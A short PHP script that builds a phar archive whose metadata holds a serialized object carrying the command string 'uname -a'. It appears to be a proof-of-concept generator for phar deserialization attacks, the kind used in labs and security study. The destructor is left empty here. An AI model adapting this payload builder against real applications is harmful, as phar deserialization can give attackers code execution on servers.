#!/usr/bin/php
<?php
class AnyClass {
    public $name;
    function __destruct() {}
}

class ChildClass extends AnyClass{
    protected $wc;
    public function make(){
        $this->wc = new AnyClass();
        $this->wc->name = 'uname -a';
    }

    public function makePhar(){
        @unlink("phar.phar");
        $phar = new Phar("phar.phar");
        $phar->startBuffering();
        $phar->addFromString("test.txt","test");
        $phar->setStub("<?php __HALT_COMPILER(); ?>");
        var_dump($this->wc);
        $phar->setMetadata($this->wc);
        $phar->stopBuffering();
    }
}
$newObj = new ChildClass();
$newObj->make();
$newObj->makePhar();
?>
